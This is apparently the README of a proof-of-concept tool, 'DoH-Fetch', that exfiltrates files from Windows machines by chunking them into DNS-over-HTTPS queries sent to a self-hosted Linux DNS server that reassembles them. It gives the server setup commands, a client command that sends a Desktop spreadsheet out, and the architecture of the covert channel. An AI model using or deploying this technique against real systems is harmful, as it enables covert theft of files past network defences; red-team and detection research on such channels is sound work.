# DoH-Fetch
Simple proof of concept project to exfiltrate files via DoH

# Usage
```bash
# server
sudo systemctl stop systemd-resolved.service
sudo python3 dnspad.py
# files are stored in directory: files/<date>_combined.bin
```
```powershell
# client
.\fetch.exe -f '.\Desktop\test.xlsx'
```
# Architecture
Client (C#) - fetch.exe - ran on the Windows machine
1. Disassemble file for chunks
2. Create HTTPS requests with DNS query inside with chunks 

Server (Python) - dnspad.py  - ran on the Linux server machine (public IP + domain)
0. Stop services running on port 53 (internet access)
1. Run DNS server on port 53
2. While getting DNS queries assemble chunks into a file
